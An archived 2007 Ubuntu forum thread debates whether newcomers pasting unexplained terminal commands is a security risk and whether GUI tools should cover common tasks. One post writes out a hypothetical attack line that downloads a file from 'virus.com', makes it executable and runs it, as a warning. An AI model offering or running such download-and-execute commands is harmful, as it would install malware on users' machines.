---
title: "Possible security risk - commandline"
date: 2007-06-04
forum: Desktop Environments
---

### Post by Jh00 on 2007-06-04
Hi there,

I don't know if this is the proper forum to write this to, so sorry if it isn't. 

This has bothering me for some time: if one of the main Ubuntu goals is to make Linux available for the masses, I was wondering why there isn't a bug #2 like "abolish the need of command line for trivial tasks". 

My reasoning is simple: Linux is very powerful, and the wrong command on the wrong hands can produce really bad results, not only for the owner's PC, but even for the internet itself.

Just have a look at these forums and you will see lots and lots of replies telling an user to "ALT+F2 and type this". In most of the cases, the command involves sudoing, installing something or editing a config file, and generally, these instructions are aimed to set the proper resolution, to fix a sound issue or to make the desktop look better.

My point is that, by "teaching" the new user that some things in Linux MUST be fixed by command line only, it may sound common to him to resort to such practice to fix anything Linux. However, as Ubuntu gains marketshare and becomes even more popular, I already foresee spamers abusing this practice to generate new zombies or producing malicious results by exploiting new users lack of knowledge.

Now tell me: considering how arcane some commads looks like, how to expect that a newbie would actually know what the results would be?

Please remember that Linux is secure as long as the user knows what he is doing or at least is not messing with the system. It can take just only one good written piped command to make the Linux box send lots of packets to a target every time it boots, which could contribute to a massive DoS.

If this command line was supposed to "INCR3ASE Y0UR FRAME RATES BY 100%!!!!", I don't doubt that this would be used by many, many people, in the future when Linux is more widely used.

So, I guess it is time to start looking at the future to prevent this practice, by focusing LOTS of attention to the GUI aspects of the system. I should be able to configure or fix most of things by using the GUI that comes with Ubuntu, without needing to use the command line. This sould be the top priority.

Thank you for your time.
Jh00

---

### Post by timzak on 2007-06-04
I think you make some very good points.  I'm somewhat of a newbie (my first experience with Linux was when Feisty came out a little over a month ago) and now that I have a little better understanding of how the OS works, I'm a little shocked to look back at how blindly I typed (or copy/pasted) commands in the console just because someone in a forum said to, to fix my problem of the moment (perhaps not coincidentally, I'm on my 3rd install of Feisty because it was easier/quicker to reinstall than to try and fix the problem I created for myself).  I'm not disparaging all the really helpful people here, but the power of the console should not be taken lightly.  I agree that as more newbs come aboard, the potential for a lot of people to really hose their systems out of ignorance increases.  Efforts need to be made to give the simplest GUI-related solution as often as possible.  I've seen on more than one occasion in these forums where a complicated, console solution is given when a much simpler (point and click) solution was available for a newbie.

Granted, I've really grown to appreciate and enjoy the intricacies of Feisty, but I think I'm a little more computer-savvy than the typical person on the street.  I'd wager that most people would run back to Windows after going through 3 installs trying to get things just right.

---

### Post by astoltz on 2007-06-04
Well I'll just add that most Windows mal-ware relies on users blindly clicking through the many dialogs that present themselves during install.  So a fancy GUI is not the answer.  In fact, I'd say that mass distibution of some nefarious command via a positing on a forum (even one as well-read as this) is highly unlikely.

---

### Post by llamakc on 2007-06-04
When Ubuntu removes the commandline, it removes me.

---

### Post by Feba on 2007-06-04
The thing is, the GUI just can't do some things. Like someone said in another thread "If you make a GUI of this, it's just going to have a bunch of check boxes that the user still won't know how to use"

and really, embrace the command line, and help new users to embrace it. Compare the following.

Let's say I want to add the racing game "Torcs" to my computer. I can two this two ways through the apt package. 

In the GUI, I can click Applications, Add/Remove, wait for it to update, click games, scroll down to Torcs, click the check box, press apply, enter my password on the popup, wait for it to download, install, have Add/Remove update again, then close add/remove.

In the CLI, I press F12 to open a terminal (I use Tilda), I type sudo apt-get install torcs, I enter my password, wait for it to download, install, and i'm done. I probably did this in half to a quarter of the time compared to the GUI.

The GUI does have it's benefits, I personally can't imagine managing files through CLI alone, but some things are best left to the command line. Also, keep in mind some things may require being run in a terminal.

---

### Post by llamakc on 2007-06-04
I rarely ever use Nautilus to manipulate files.

---

### Post by z0phi3l on 2007-06-04
The CL is THE best way to get things done

I've noticed that a large amount of "problems" newer users have involve using GUI tools, especially when at most all you need is a "apt-get install XXX"

---

### Post by Jh00 on 2007-06-04
I welcome the replies! I really wanted to spark some discussion about this issue.

I am found of CL as well, and in no way I am saying that it should be abolished for good (I can't even imagine how GNU/Linux would be without it).

But we should keep things in perspective here: as I said, Ubuntu should be for the masses, and we know that the masses aren't computer savy. Today we may be helping them by teaching how to accomplish something using the command line, but if we don't change things, it is going to be ugly in the future. Keep following my rationale:

**"Windows users already click malware/virus/trojans"**
It is true. But they still need to DOWNLOAD something to do some harm. Ubuntu, on the other way, comes pre-installed with LOADS of command line software than can do some nasty things already, you just need to type or paste one simple command and voilá - _not even anti-virus software would prevent it_.

Hell, you can even paste a single command-line to make a "virus" out of bash, since it can be programmed to do so much! Just imagine a sequence of echo "bash command" > virus.file ; repeat

**"Linux, by nature, is more secure than Windows"**
It is not totally true. As I mentioned before, just have a look at the forum and you will see lots of sudoing here and there. Although don't even letting the user know about the root user is a good thing, they still run commands with root power frequently, without even knowing what it does. It may not seem a problem now, but as the Ubuntu marketshare increases, you can bet that people will take advantage of that.

A good crafted CL, with few lines, could be used to send personal information to someone else without him ever needing to download anything - just running the arcane command line that "was supposed to double HD space"...

**"Linux is free of viruses"**
It may be, but just because virus makers didn't get interested to do so, because: a) Those who use Linux today probably know what they are doing and b) Linux isn't widespread.

But I'm counting that Ubuntu will be a major player in the OS world, and soon virus will be released that target Linux (Ubuntu) as well. And you must agree with me: it is fair EASIER to get infected by a hypotetical virus in Ubuntu from a bad CL than from downloading an executable file (just think that the user would still need to set the file executable).

**"It would be impossible to create a GUI with all options"**
It certainly would, but no one is saying to do that! Pay special attention to make the most requested tweaks accessed by a GUI (for example, services, display properties, Gnome customizations etc.) and those options that are for more advanced users, well, create a GUI interface to edit options in a xml format (as a kind of "registry"). 

Windows too has lots of options, and those too specific to be presented as checkboxes are available in the registry (which still is somewhat of a GUI). There is no way that a Windows user would be invited to type something like  "sudo wget [http://www.virus.com/virus](http://www.virus.com/virus) ; chmod +x virus ; ./virus ; vi /etc/fstab"

The idea is to focus on keeping newbie users as far from the CL as possible. _ This is the priority that I'm talking about_.As they get to know the system better, they will be very welcome to try the CL.

**"CL is the best way to get things done"**
It probably is, unless we are talking about a newbie. If you know what you are doing, keep on going. The problem is that most people doen't know what they are doing. If a command line is suggested by someone from this forum, for example, there will probably be no problem. But as Ubuntu gets more popular and commands start arriving by email, it won't be so.

**Conclusion**
CL is too powerful and can be abused. It should be used only by those who really knows what they are doing. Flocks of new users are just now gettnig to know Linux and its powers, but if the fire catches on and we don't do anything about it now, things will get ugly in the future.

It would be a major mistake to wait until things get bad to think about a solution.

Thanks for your time!
Jh00

---

### Post by timzak on 2007-06-04
I think that if people were to explain how and why to do what they advise to do, it would put a little confidence in a newbie's use of the console.  A newbie wanting to install a program could just (very easily) install it from Add/Remove.  He knows it's the right program and not some wild good chase.  Whereas someone on a forum telling him to sudo apt-get, especially for a newbie, he could be downloading anything and not know any better.  There's a trust factor installing from Add/Remove or Synaptic that's not there following someone's console advise (especially for a newbie).

It actually took me about a week to figure out how easy it was to install programs from Add/Remove and Synaptic, because people kept instructing me to install from the console.  Later as I realized the wealth of programs available to me, I kept recognizing programs I either installed or attempted to install manually and wondered, "why didn't they just instruct me how to install from Synaptic?"

Because the console is touted as such a powerful thing, newbies naturally will be intimidated by being instructed to work through it when there is a more familiar (to them) GUI option available to do the same thing.

Now that my feet are wet, I do enjoy learning more about the command line, but I was a little intimidated and overwhelmed for a few weeks.  I just don't think most non-technically-minded folks would put up with that.  That's why I encouraged in my post above that newbies to be taught GUI methods.  They'll have plenty of time once theiry comfy to familiarize themselves with the console.

---

### Post by Feba on 2007-06-04
> he could be downloading anything and not know any better. There's a trust factor installing from Add/Remove or Synaptic that's not there following someone's console adviseUh, you do know how repos work, right? Synaptic is just a GUI for apt. 

When you install something in synaptic, the GUI is basically sending a "sudo apt-get" command for you. 

People don't need to be technically minded, they just need to be shown how much quicker and easier things can be once they learn a small list of commands. It's not like learning another language, honestly.

---

### Post by msu.falcon on 2007-06-05
> **Feba said:**
>  It's not like learning another language, honestly.

Actually, it is.

Those of us who have lived with the command line in one form or another for a while now see it as natural. And yes, the command line is **very** powerful in the hands of a capable user.

However, pointing and clicking on things is much more intuitive for those new to computers than learning a lot of commands. A set of inputs that works reliably for everything (similar to the right click on something to click on properties kind of interface) seriously lowers the learning curve.  Eventually, pointing with a mouse will become out-dated by using our hands and speaking and our eye movement.

Computing needs to be (and is) moving more toward natural human interaction, not forcing humans to think more like computers.

Nobody's suggesting taking power away from the command line. *Everything* you can do via the GUI should be possible via command line. But you know what, the command line's just another tool, it's not sacred. You use it to get a lot of jobs done more quickly. But I sure as heck wouldn't want to use the command line to edit a photo or draw a picture. Use the appropriate tools for the appropriate jobs, and give new users an easy interface to use.

The point we should be aiming for is that a normal user should never have to touch the command line to get everyday computing tasks and configuration done, but power users can still use it as much as they want.

---

### Post by Feba on 2007-06-05
I've been using Ubuntu for the past few months. I've been learning the command line for the past few days. It's not that bad.

Like I said, the CLI and GUI both have their benefits. System tasks are just better to use the CLI for. An OS doesn't have to be a cakewalk in order to be easy, and in cases where the terminal can handle tasks just as well or better, the user should learn to use it. 

Trying to hide it from new users is like trying to hide the manual transmission from someone who wants to go into racing =/ Everyday things (going to the grocery store) can be handled perfectly well by a GUI (AT), but if you want to pull someone out of a ditch, you should probably have a manual transmission, and the knowledge to do it. Part of me almost thinks it's a good thing to force people to seek out help for commands at first, to prevent them from randomly fiddling with things. Try running apt-get remove apt to see what I mean. You have to be very deliberate to mess up your system, as you should.

---

### Post by msu.falcon on 2007-06-05
But as long as that is the mindset of Linux, Linux will always have a smaller user-share than Windows and OS X. If that's something you're okay with, then fine.

But if we want open source software to grow, it's an issue that needs to be addressed. Yes, using a computer without knowing how to "drive" it can be dangerous, but the truth of the matter is that some people just need it to go from point A to point B. They don't need to know how it runs, they just need it to get the job done. If something needs to be fixed, they can always take it to someone who does know how it runs.

That's just the reality of computing. The majority of people out there currently fall into that group. That may change as more and more kids grow up, but OSS is about inclusion, not exclusion.

My friend's grandfather and my parents are two examples of people that I would never see using the command-line. Personally, I love Ubuntu.  For them, I'd recommend OS X. I don't want that to be the case forever.

---

### Post by Feba on 2007-06-05
And that's exactly the thing. The end user doesn't fuss with advanced config options. The people that do are already computer oriented, learning this won't kill them. The average user who just needs to go from A to B has a preinstalled OS.

---

### Post by Chayak on 2007-06-05
In all fairness, every major OS has CLI be it Windows (the recent introduction of Powershell, MS's attempt to make the windows CLI as powerful as other OSs).  OS-X has a full unix command line and so does Linux.  In all honesty you can complain all you want about the CLI but it's not going away.

---

### Post by Jh00 on 2007-06-05
I will be redundant again - it's not a matter if CL is good or bad, the thing is that new users should not have to deal with it because it can possibly do more harm than good on the long run.

---

### Post by timzak on 2007-06-05
> **Feba said:**
> Uh, you do know how repos work, right? Synaptic is just a GUI for apt. 

When you install something in synaptic, the GUI is basically sending a "sudo apt-get" command for you. 

People don't need to be technically minded, they just need to be shown how much quicker and easier things can be once they learn a small list of commands. It's not like learning another language, honestly.

I did mention I'm a relative newb, didn't I?  ;)  I've only been using Linux since Feisty was released in April.  For some reason, I had it in my mind that you could install anything from anywhere if you just typed the right thing into the command line.  My thinking was someone wanting to do harm could have a malware ready to be downloaded by a newb who blindly follows instructions to fix his problem.  Now that I think about it (and now that you point it out) sudo apt-get can only download what is in the repositories, which is the same thing that is in Synaptic.

Thanks for clarifying.

---

### Post by EndPerform on 2007-06-05
> 
Please remember that Linux is secure as long as the user knows what he is doing or at least is not messing with the system. It can take just only one good written piped command to make the Linux box send lots of packets to a target every time it boots, which could contribute to a massive DoS.


That would have to be some command.  It would most likely need to write a script and be installed into the right place, as well as be executed at the correct time.  I don't think I've EVER seen one command do as you have mentioned here.  Besides, I don't think spammers / virus writers would resort to hoping a user types a series of commands, more than likely they would attempt to find a vulnerability and exploit it with a tainted software package, which *could* be installed via the terminal, but most new users use Synaptic with official repositories, and getting something into those to taint a system is not an easy task, if even possible.

> 
It is true. But they still need to DOWNLOAD something to do some harm. Ubuntu, on the other way, comes pre-installed with LOADS of command line software than can do some nasty things already, you just need to type or paste one simple command and voilá - not even anti-virus software would prevent it.


Really?  I bet I could give a Windows user with a fresh install and nothing downloaded one command that would hose their system, too.  This is more of a malicious command, NOT a virus.  cmd.exe is just as dangerous as /bin/bash

> 
But I'm counting that Ubuntu will be a major player in the OS world, and soon virus will be released that target Linux (Ubuntu) as well. And you must agree with me: it is fair EASIER to get infected by a hypotetical virus in Ubuntu from a bad CL than from downloading an executable file (just think that the user would still need to set the file executable).

No, I don't agree.  For example, let's say you're on Windows, and you downloaded an infected program without knowing it.  You run it, and now you're infected.  You would need to download something in Ubuntu to get the same effect.  If a user downloaded an infected .DEB, then did a dpkg -i on it, the system now contains a tainted program.  BUT, if a user sticks with the standard repositories, there would have to be a breech in the package repository to get the malware onto a machine.  So really, it's a bit harder on Ubuntu since it's not a simple double-click, install method.

> 
A good crafted CL, with few lines, could be used to send personal information to someone else without him ever needing to download anything - just running the arcane command line that "was supposed to double HD space"...


I somehow doubt this would come up, especially if said command depends on certain conditions (personal information filled out, package x installed, this installed, etc).  I just don't see this happening.  

I'm by no means a Linux zealot, nor am I trying to shoot down your concerns, but I think it's a little bit more difficult than you think to cause issues with the command line, especially if the user is getting their information from the forums.  I don't see a spammer getting on here anytime soon and starting to post 'evil' commands, as either the moderators would get all over it, or other users would jump in and warn about the potential issue with the command.

It all comes down to the user, as is always going to be the case.  A lot of times, the issues being resolved by the commands to be used on the command line are due to something not working correctly, perhaps a bug or something else, not an every day configuration item.  Most of that is handled via GUI already.  If a user comes to a trusted source for help, such as these forums, the #ubuntu IRC channel, or the mailing list, then the chances are far less of this happening.

---

### Post by Feba on 2007-06-05
> I will be redundant again - it's not a matter if CL is good or bad, the thing is that new users should not have to deal with it because it can possibly do more harm than good on the long run.

Same with the GUI. If I wanted to, I could format / with the GUI. It's not our job to protect users from themselves. If people want to enter random commands, or commands that they don't know what they will do, that's their problem.

---

### Post by llamakc on 2007-06-05
An Etch-a-Sketch can be dangerous in the wrong hands.

---

### Post by hammedhaaret on 2007-06-05
As a pretty new user i really need to be presented with an explaination of how the CL works.
so far I've been using HOWTOS and copy/pasting 'sudo' commands without ever knowing what i was doing, trusting blindly in the more techsavy users. 
From all the copy/pasting I've been able to get an tiny idea of how it all adds up, but im not at all sure.
Any detailed description would be godsend for a new linux user before going on to be spoonfed sudo commands as i did, and still am.

Of course im more than grateful to all who have helped me and so far none have had anything but good intentions, but still... i share your concern.

hammedhaaret

---

### Post by Feba on 2007-06-05
There's plenty of guides out there to using the command line.

---

### Post by dryder on 2007-06-05
When moving to Linux you *are* moving "up" in the "need to learn about the OS" or, if you like "down under the hood at the engine".

That is what Linux/UNIX are about - control of the OS and its functionality.

Sure, the apps look nice and pretty. Sure, there is a GUI interface. But do you want control, fine-tuning, the ability to write a driver (try that in Windows!)? In Linux/UNIX can do it much more easily than in Windows. Do you want more processing power instead of wasted cpu time, a more secure environment? Again, Linux/UNIX provide that ability.

Don't start work in the garage if all you want is a fancy point and click, one size fits all environment. Yes, Linux distros are providing GUIs but as an alternative. What gui will enable you to modify / write a driver?

Sorry, but when moving to Linux/UNIX you are NOT moving to an alternate GUI or just free software - you are moving to where you are expected to learn how computer OS' work. Even xx-DOS expected you to learn the command-line. Pathetic as it was.

Is it 'asking for trouble with us newbies'? Of course it is - we are learning the guts of something not playing point and click. But there is no shame if you want to just point and click - and Windows is probably better if that is all you want. Just as wanting to know more about the OS engine has no shame even when we make mistakes.

My UNIX mainframe background 30 years ago was long forgotten so Linux is new to me like most starting with it. But in all the time I have been using it I have never done anything I can't undo - I even worked out how to undo the recent feisty update. A lot of updates in other environments can not be easily undone.

just mho,
David (at the risk of being ostracised :) )

---

### Post by EndPerform on 2007-06-05
Additionally, I had posted about this on my site and got an interesting comment.  Even with a pretty GUI configuration option, there still lies the problem that a user could be lead astray by what he reads.  For example, someone could say that in order to fix a file or two, you'd need to run GParted and delete the entire partition.  While far-fetched, this could happen, especially if a new user just blindly follows commands to the letter without taking into account WHAT he's doing.

---

### Post by AZzKikR on 2007-06-06
> **EndPerform said:**
> For example, someone could say that in order to fix a file or two, you'd need to run GParted and delete the entire partition.  While far-fetched, this could happen, especially if a new user just blindly follows commands to the letter without taking into account WHAT he's doing.

Or install PartitionMagic on his Windows machine and delete a partition or two to fix a problem.

What my point is with this comment is: people tend to listen to more technical minded people. Stupid people tend to follow every instruction they get. Not only in computers, in other areas as well. If you say to a user that to fix his problem, he should format his C drive (a regularly made joke on forums, IRC and whatnot) and one of those users do not have the slightest clue what it does but still does it, he or she is literally screwed. 

This same thing goes for Ubuntu. Yes, the command line *might* pose a possible security risk, but so does every other action to an ignorant user. I too have frequently seen commands posted on this forum saying "use sudo this/that to do this action" - which I find totally awful when the author of that command does not write what that command does, exactly. 

I don't think it will ever be possible for people to just know how to use a computer out-of-the-box. Windows or Linux or Mac OS. Hell, I am a very experienced computer user, Windows AND Linux. When I need to do some work on my girlfriend's Mac, I am totally lost (user interface-wise). I need an introduction on how and what. I miss the right mouse click. Stuff like that. My point being: users need an introduction to an OS, because every OS can do malicious things. 

In this case, a user needs an introduction about the command line and it's dangers. Perhaps on a fresh install, some kind of a window pops up "Welcom to Ubuntu! Let's give you a tour!" ?

Protect the users from themselves by informing them. I won't expect them to know EVERYTHING, as long as they know what can be dangerous, and what is safe.

My 2 cents.

---

### Post by EndPerform on 2007-06-06
I agree with what you're saying, I was just illustrating what an end user may do.  But, the idea of a tour might be good, going over what you have, a few common tasks, etc.

---

### Post by PointSource on 2007-06-06
Just type in this command and all will be well...
"man xxxxx"
;-)

Seriously, I "man" almost every command I find. That or " --help". An instructor doesn't have to retype explanations of what could/would be done.

---

### Post by Feba on 2007-06-06
Maybe we should have a forced tutorial and starter guide for Ubuntu. Like, when it boots for the first time after installation, it shows you how to install things through sudo, add/remove, shows you how to operate it, etc., and the only way out would be to type a password phrase in to skip it (so existing users don't go insane every time they install it), such as "donethis" or "passedtut", something simple to remember for anyone who's done it, but something to keep people who haven't forced to learn it. I fully believe that anyone who can benefit from a tutorial will either find it in a location, or they will avoid it, if it is not forced upon them.

---

### Post by hammedhaaret on 2007-06-06
maybe a bit dramatic Feba. but yes, needed a guide to tell me what i, and others, are able to do in the terminal.
when i first installed ubuntu a little month ago or so it didn't strike me as the first thing to do was go and look for a guide for how to use the CL.   no first began to look for a way to change my resolution cause i could see that was all wrong... i did that in these forums and before i knew it I had written tons of stuff in terminal that I wasn't at all sure of what were doing.
so maybe there's tons of guides out there but you need to be looking to find, right (:

---

### Post by Chayak on 2007-06-06
Well I've seen one little jewel happen before  the infamous "Yeah just type 'rm ... (would be sudo rm ... for Ubuntu)'"  I made the mistake of saying that as a joke once and one of my junior guys happily typed it away in root.  We spent the rest of the night rebuilding that server... one reason I'm so keen on backups now. ;)

---

### Post by Jh00 on 2007-06-06
> **dryder said:**
> When moving to Linux you *are* moving "up" in the "need to learn about the OS" or, if you like "down under the hood at the engine".

That is what Linux/UNIX are about - control of the OS and its functionality.

Sure, the apps look nice and pretty. Sure, there is a GUI interface. But do you want control, fine-tuning, the ability to write a driver (try that in Windows!)? In Linux/UNIX can do it much more easily than in Windows. Do you want more processing power instead of wasted cpu time, a more secure environment? Again, Linux/UNIX provide that ability.



Dryder, I agree with you with that, but IMHO, Linux isn't the same as Ubuntu. Your argument is the one that could be used until now. Ubuntu, as I understand it, is all about bringing a free OS to "human beings".

It is not acceptable to say "since you are now willing to use Linux, you should learn a few difficult commands to **do simple tasks"**, in the Ubuntu context. 

If so, shipit CD's should have a very big red and yellow stick reading "Attention: The proper use of this software demands extensive reading of documentation, guides and FAQs". 

I always picture Ubuntu as something my grandma would be able to use, and I can't picture my grandma having to deal with CL just to fix something trivial.

---

### Post by Ozeuss on 2007-06-06
To my understanding, though i've not used them personally, ubuntu requires the use of the command line more than opensuse or mandriva.
I do think that as things develop there will be more and more GUI options, but the command line will always be there, since its such a central part of every GNU/Linux distro. and it will always be easier to give support with command line than in gui.
and lastly, ubuntu is supposed to be "linux for human being", but not "linux for dummies". social engineering can exploit people no matter if they're using gui, command-line or whatever. I think that  every user should 'man' or 'whatis' or google the command if he doesn't know what he's doing, and not go blindly after every advice on the forum.

---

### Post by tturrisi on 2007-06-06
Anything that can be done w/ a gui can be don via commadline, the reverse is theoretically possible but highly improbable and unlikely will ever occur on any operating system.  Even Windows requires the use of commandline for certain things.

A gui control in unfamiliar hands is as dangerous as the commandline, period, be it Windows or linux desktop.  A gui is just a frontend to lower level programs anyway, even in Windows.

The key differences are these:

Commandline is used on desktops mostly for tweaking, certain system admin tasks, customizing, etc.  Such is the case on Windows too.  And Windows also has a registry that can easily be used to hose a system in unskilled hands.  Should access to regedit be denied the owner of the system? (joke)  You can hose a Windows system using the commandline or scripting as easily as in linux.

There are thousands of commandline system-admin utils for linux.  And there are no guis for the majority of "necessary" utils.  And it will be many years until we see these guis available, mainly because they are not needed.  I highly doubt there will ever be "Tweak-NX" (counterpart to Tweak-XP. 

Safety from the commandline is built into linux desktops already.  Linux is a tru multi-user operating system.  If a user is logged on and he does not know the root password, guess what, he can't run root processes that could hose the system!  Sure, he could delete his /home dir, but so what, the admin can also put it back again if he has a backup and the system will still run regardless if his /home gets deleted.  Unlike in Windows, any logged on user can potentially hose the complete system rendering it unusable.

---

### Post by dryder on 2007-06-06
Jh00,

I understand what you are saying and I would suggest that with Ubuntu if you want gui only you can stay gui only - it is just that the 'power' of control and knowledge will not be there and some want/need that.

Perhaps it would be good if we could ask ***every post*** that gives command line instructions to explain his/her instruction. I have seen many where the poster just did not know linux commands very well.

This way we could learn the language and syntax and evaluate the validity or relevancy of the reply. And very soon be asking fewer questions "how do I ..?"

I detect a certain 'snobbishness' in a lot of posts giving instructions which is a direct reflection of the real world - "I know how to do it so do this (but I'm not going to tell you what it means so I always know more than you)". In these forums most are very well intentioned but explaining would go a long way.

But may I ask, what is wrong with wanting the command line? Are we all going to end up speaking to computers and the actions being carried out - as in Star Trek? No, because there will be people designing the chips - and they need to know binary and hex. There will always be low level programmers who need to know computer numbering systems and assembler and there will always be high level language programmers to get the computer programms. The mathematics and science of speech recognition leaves me for dead.

Then there is the end user .... until, of course, computers design and program themselves 100% by which time none of us will even know what 12x12 =  as it would be as unnecessary as many claim understanding logarithms is now - just use a calculator. Which is sad because this is where it really gets dangerous - using a calculator(computer) to get a result when you haven't the foggiest what you are doing.

I've seen people ruin photographs in photoshop because they didn't know the program - and were working on the original. The CL/gui argument cuts both ways.

jmho
David

---

### Post by Feba on 2007-06-06
The fact is, nobody is ever going to use an OS correctly without having to read some sort of guide or FAQ anyway, there's no point making GUIs for everything and gimping users.

Look at XP. How would a starting user find out how to change their settings? They click start. A bunch of weird names, but nothing that really says it will help them. They look in a guide, and find out that "Control Panel" controls things like that. A basic user could not have figured this out on their own without wasting a LOT of time, in the same way that a new linux user couldn't have found a command without reading a guide.

There are plenty of examples of this, things you think are easy with a GUI *STILL DO* need guides, there's a giant industry of HOWTO books and websites and forums that prove this to be true. If the user is going to have to learn something, they might as well learn the command line, since it is more powerful, and will serve them better in the long run.

---

### Post by llamakc on 2007-06-06
> **Jh00 said:**
> Dryder, I agree with you with that, but IMHO, Linux isn't the same as Ubuntu. Your argument is the one that could be used until now. Ubuntu, as I understand it, is all about bringing a free OS to "human beings".

It is not acceptable to say "since you are now willing to use Linux, you should learn a few difficult commands to **do simple tasks"**, in the Ubuntu context. 

If so, shipit CD's should have a very big red and yellow stick reading "Attention: The proper use of this software demands extensive reading of documentation, guides and FAQs". 

I always picture Ubuntu as something my grandma would be able to use, and I can't picture my grandma having to deal with CL just to fix something trivial.

My grandmother, my daughter, and my son use Ubuntu with NEVER having to use the CLI to fix anything. 

What particular problems have you railing against the command-line?

---

### Post by tturrisi on 2007-06-06
...and for theose who want to learn more basics:
[http://www.linuxcommand.org/index.php](http://www.linuxcommand.org/index.php)

---

### Post by Chris S. on 2007-06-07
It's not the interface that's the problem, it's the user.  It's always the user.  The user may be stupid, ignorant, or just in a rush to get a quick-fix for something.  When I started using Ubuntu, a few starter guides actually said that Ubuntu support is so much better because you can just copy and paste commands from "experts" without having to worry about vague step-by-step instructions through complicated GUIs.  I can imagine a lot of people do it blindly, without even bothering to check what commands might be executed.

Hell, I might have done it a few times recently.  I watch what commands I'm using, but sometimes I'm not 100% sure what they do.  I'm not worried so much about security, but I may have made a mess of some things.  So really, I don't think security issues in the form of blind copy/pastes will be a big issue, but just plain bad advice will be a problem, such as not reminding users to back up system files before editing them.  Install a fun, new screensaver, but edit xorg.conf with a special setting ... something along those lines.

A tour sounds nice, just to give users an intro into what they're getting into, but it seems like most people learn one way or another without it, and the rest wouldn't bother.

I'd rather recommend to newbies that before all else, even before making backups of important files, that they should keep a record somewhere of all the changes they make for a few weeks.  Packages installed, files edited, the desired results, where they found solutions.  I've already reinstalled Ubuntu once after I screwed up display drivers, xorg, Beryl, sound, suspend, and overall system stability.  The second time around, I was more aware of what advice worked and what advice was utter crap (and alot of it was from these very forums).  I got a huge number of applications up in running in only a few hours since I knew exactly what to do.

Just keeping a record of what works (or what is likely to work) makes the likely inevitable reinstall much smoother, and leeds to a much more stable system.  If any malicious commands do end up in someone's terminal, at least the recovery will be so much easier.  And if they happened to record those commands somewhere else first, they might track them down.  It's pretty painless if all you're doing is command-line work; just one more paste.  Aside from that, there's little more you can do to prevent the user from doing something bad besides constant reminders ... 

Hey, wasn't that one of the gripes about XP or Vista?

---

### Post by timzak on 2007-06-07
> **llamakc said:**
> My grandmother, my daughter, and my son use Ubuntu with NEVER having to use the CLI to fix anything. 

What particular problems have you railing against the command-line?

Sorry, your question was not directed at me, but I have some situations that required use of the command line.  If you want all your mouse buttons to work, you need to edit xorg.conf.  In a lot of cases, if you want your monitor's native resolution to work, you must edit xorg.conf.  These require use of the command line.  If you want to install some software, you must do so from command line.  For example, I downloaded Moneydance financial software.  It must be made executable before installing=requires command line.  I've had issues with my system freezing on restart=edit a system file via CLI.  Issue with suspend not working with Beryl=edit system file with CLI.  Issue with system time screwing with BIOS, which in turn screwed up system time in dual-boot Windows=fix via CLI.  These are just my particular issues.  I'm sure other people with different hardware will have other issues that require the CLI to get everything working as it should.  The bottom line is unless you want to live with a crippled system, you most likely will have to use the CLI at some point to get everything working as it should.

I still have unresolved issues that I haven't been able to get successful help with on these forums.  And I guarantee if I ever get them fixed, it'll be through the CLI with the help of an expert.

I'm not complaining about Ubuntu (I enjoy the challenge up to a point); I'm only giving you examples of how using the CLI is required to get your sytem working as it should.

---

### Post by timzak on 2007-06-07
> **dryder said:**
> Perhaps it would be good if we could ask ***every post*** that gives command line instructions to explain his/her instruction. I have seen many where the poster just did not know linux commands very well.

This way we could learn the language and syntax and evaluate the validity or relevancy of the reply. And very soon be asking fewer questions "how do I ..?"

I detect a certain 'snobbishness' in a lot of posts giving instructions which is a direct reflection of the real world - "I know how to do it so do this (but I'm not going to tell you what it means so I always know more than you)". In these forums most are very well intentioned but explaining would go a long way.

As a new user, I can totally agree with this.  Often, when someone replies with a solution, I have no idea HOW to implement what they've just suggested.  They explain WHAT to do, but not HOW.  So I have to make another post and wait another period of time (sometimes I never get another reply and the situation remains unresolved).

---

### Post by tturrisi on 2007-06-07
...merely poinbting out the obvious that obviously some users have forgot, which is this:
Ubuntu is an experimental operating system!  As are almost all linux distros except for the stable versions of Debian, Red Hat, Slax, etc.  But most all others are considered experimental, meaning that one is using alpha & beta software packages.  And in doing so, one will always need the cli at some point to repair, adjust, correct, install, etc.  And when I say experimental, I am not using the word in the same contect as Debian Experimental, but the context of "let's try it this way & see what happens, get user feedback, make some adjustments here & there, release new editions-packages every 6 months, get feedback, make adjustments, etc".  There's no such thing as a "works for everyone" op sys , the cli will always be necessary in stable op systems & more so in experiments.

---

### Post by sugarland2k on 2007-07-12
The command line is not a security risk, ignorance is.  If a user does not know how to use it, there are many places on the Internet and many books to learn from.  The command line is what make Ubuntu / Linux fun !  
All the power is in the command line.

I'm just a lowly hardware guy and I do ok.  If not, there are many on the forums to help you learn! 

On the web as an example...
[http://www.linuxcommand.org/](http://www.linuxcommand.org/)

[http://www.tuxfiles.org/linuxhelp/cli.html](http://www.tuxfiles.org/linuxhelp/cli.html)

[http://www.howtoforge.com/useful_linux_commands](http://www.howtoforge.com/useful_linux_commands)

---

